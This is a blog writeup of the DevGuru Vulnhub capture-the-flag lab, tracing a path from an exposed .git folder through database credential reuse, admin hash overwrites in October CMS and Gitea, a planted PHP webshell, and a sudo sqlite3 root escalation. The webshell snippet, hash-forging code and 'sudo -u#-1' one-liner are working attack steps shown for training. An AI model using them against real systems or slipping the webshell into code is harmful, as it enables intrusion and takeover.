---
layout: post
title:  Devguru Vulnhub Writeup
category: ctfs
tags: [vulnhub, ctf, golang]
published: true
author: j1v37u2k3y
show_sidebar: true
toc: true
searchable: true
---
DevGuru is a fictional web development company hiring you for a pentest assessment. You have been tasked with finding vulnerabilities on their corporate website and obtaining root.

OSCP like ~ Real life based

Difficulty: Intermediate (Depends on experience)

<!--cut-->

# NMAP
<a href="{{ site.baseurl }}/assets/reports/nmap/vulnhub/devguru/version.html" target="_blank" title="Devguru NMAP Scan">Devguru NMAP Scan</a> 
 
# We have access to the .git folder

[![](/assets/images/vulnhub/devguru/img.png)](/assets/images/vulnhub/devguru/img.png)

## Dump the source code

```bash
└──╼ # /opt/git-dumper/git-dumper.py http://devguru.local/ website/
```

## adminer.php and db creds for application:

[![](/assets/images/vulnhub/devguru/img2.png)](/assets/images/vulnhub/devguru/img2.png)

# Login to adminer.php and see Frank Morris hash

```php
<?php

//config/database.php
return [
/*****/
'mysql' => [
            'driver'     => 'mysql',
            'engine'     => 'InnoDB',
            'host'       => 'localhost',
            'port'       => 3306,
            'database'   => 'octoberdb',
            'username'   => 'october',
            'password'   => 'SQ66EBYx4GT3byXH',
            'charset'    => 'utf8mb4',
            'collation'  => 'utf8mb4_unicode_ci',
            'prefix'     => '',
            'varcharmax' => 191,
        ],
/*****/
];
```

[![](/assets/images/vulnhub/devguru/img3.png)](/assets/images/vulnhub/devguru/img3.png)

- Old hash (just in case we need it)

```text
$2y$10$bp5wBfbAN6lMYT27pJMomOGutDF2RKZKYZITAupZ3x8eAaYgN6EKK
```

## So can we change the hash to something we know:

```sql
INSERT INTO `backend_users` (`id`, `first_name`, `last_name`, `login`, `email`, `password`, `activation_code`, `persist_code`, `reset_password_code`, `permissions`, `is_activated`, `activated_at`, `last_login`, `created_at`, `updated_at`) VALUES
(1, 'Admin', 'Person', 'admin', 'admin@domain.tld', '$2y$10$VOrmqckzw7JoQXsqUxB0mO65d3m.vwrkXlmzcktEaKAccqwnY/JF6', NULL, NULL, NULL, '{"superuser":1}', 1, NULL, NULL, '2015-05-08 07:55:26', '2015-05-08 07:55:26');

INSERT INTO `backend_users_groups` (`user_id`, `user_group_id`) VALUES
(1, 1);

INSERT INTO `backend_user_groups` (`id`, `name`, `permissions`, `created_at`, `updated_at`, `code`, `description`, `is_new_user_default`) VALUES
(1, 'Admins', NULL, '2015-05-08 07:55:25', '2015-05-08 07:55:25', 'admins', 'Default group for administrators', 1);
```

 - insert this into the field for Frank:
 - (admin) is the password

```text
$2y$10$VOrmqckzw7JoQXsqUxB0mO65d3m.vwrkXlmzcktEaKAccqwnY/JF6
```

![/assets/images/vulnhub/devguru/img4.png](/assets/images/vulnhub/devguru/img4.png)


# Login back in the frontend with `admin:admin` and setup our webshell

[![](/assets/images/vulnhub/devguru/15cc7f92.png)](/assets/images/vulnhub/devguru/15cc7f92.png)

![](/assets/images/vulnhub/devguru/5fddd748.png)

```php
function onStart()
{
    $this->page["myVar"] = shell_exec($_GET['jiveturkey']);
}
```

## Examples

[![](/assets/images/vulnhub/devguru/45505b19.png)](/assets/images/vulnhub/devguru/45505b19.png)

[![](/assets/images/vulnhub/devguru/aa9ad7ea.png)](/assets/images/vulnhub/devguru/aa9ad7ea.png)

# Reverse Shell as www-data

[![](/assets/images/vulnhub/devguru/c5a00bb4.png)](/assets/images/vulnhub/devguru/c5a00bb4.png)

# Run linpeas to check for vulns etc

[![](/assets/images/vulnhub/devguru/530bc751.png)](/assets/images/vulnhub/devguru/530bc751.png)

## Database access as gitea

[![](/assets/images/vulnhub/devguru/d333d497.png)](/assets/images/vulnhub/devguru/d333d497.png)

```text
; Database to use. Either "mysql", "postgres", "mssql" or "sqlite3".
DB_TYPE             = mysql
HOST                = 127.0.0.1:3306
NAME                = gitea
USER                = gitea
; Use PASSWD = `your password` for quoting if you use special characters in the password.
PASSWD              = UfFPTF8C8jjxVF2m
```

## Find franks gitea hash

[![](/assets/images/vulnhub/devguru/3c928e55.png)](/assets/images/vulnhub/devguru/3c928e55.png)

```
c200e0d03d1604cee72c484f154dd82d75c7247b04ea971a96dd1def8682d02488d0323397e26a18fb806c7a20f0b564c900
```

# Can create a new hash with hashPassword method from gitea source code

 - <https://github.com/go-gitea/gitea/blob/f915161a2f1f4a1c436e7a96cfc88f61ae8fbce6/models/user.go>

```go
func hashPassword(passwd, salt, algo string) string {
	var tempPasswd []byte

	switch algo {
	case algoBcrypt:
		tempPasswd, _ = bcrypt.GenerateFromPassword([]byte(passwd), bcrypt.DefaultCost)
		return string(tempPasswd)
	case algoScrypt:
		tempPasswd, _ = scrypt.Key([]byte(passwd), []byte(salt), 65536, 16, 2, 50)
	case algoArgon2:
		tempPasswd = argon2.IDKey([]byte(passwd), []byte(salt), 2, 65536, 8, 50)
	case algoPbkdf2:
		fallthrough
	default:
		tempPasswd = pbkdf2.Key([]byte(passwd), []byte(salt), 10000, 50, sha256.New)
	}

	return fmt.Sprintf("%x", tempPasswd)
}
```

### POC code from go playground

 - <https://play.golang.org/p/AEbT0t18bz4>

```go
package main

import (
	"fmt"
	"golang.org/x/crypto/pbkdf2"
	"crypto/sha256"
)

func main() {
	fmt.Println("Hello, playground")
	
	var tempPasswd []byte

	tempPasswd = pbkdf2.Key([]byte("j1v37u2k3y"), []byte("Bop8nwtUiM"), 10000, 50, sha256.New)

	fmt.Println(fmt.Sprintf("%x", tempPasswd))
}
```

### Generated hash to insert into sql password for frank

```text
Hello, playground
20d248976f4845ab3f12203ec060ff4095a1a6cbdc1887a5f2fec36b559d9964d8365d802badfe1f263d44f072476517d93c
```

[![](/assets/images/vulnhub/devguru/0078ffa7.png)](/assets/images/vulnhub/devguru/0078ffa7.png)

# Logged in as frank on Gitea

[![](/assets/images/vulnhub/devguru/bd25986b.png)](/assets/images/vulnhub/devguru/bd25986b.png)

# Now we can edit the Git Hooks and put in a reverse shell.

 - Then try to commit code on repo

[![](/assets/images/vulnhub/devguru/be6eea61.png)](/assets/images/vulnhub/devguru/be6eea61.png)

## User.txt

[![](/assets/images/vulnhub/devguru/5648ff38.png)](/assets/images/vulnhub/devguru/5648ff38.png)

## SSH as frank with authorized_keys

[![](/assets/images/vulnhub/devguru/e2165841.png)](/assets/images/vulnhub/devguru/e2165841.png)

# ROOT

```shell
(ALL, !root) NOPASSWD: /usr/bin/sqlite3
```

 - <https://www.exploit-db.com/exploits/47502>
 - <https://gtfobins.github.io/gtfobins/sqlite3/#sudo>

```shell
sudo -u#-1 /usr/bin/sqlite3 /dev/null '.shell /bin/bash'
```

[![](/assets/images/vulnhub/devguru/a08026ef.png)](/assets/images/vulnhub/devguru/a08026ef.png)

## short version

```shell
id; hostname; cat msg.txt; cat root.txt;
```

[![](/assets/images/vulnhub/devguru/f58a3146.png)](/assets/images/vulnhub/devguru/f58a3146.png)
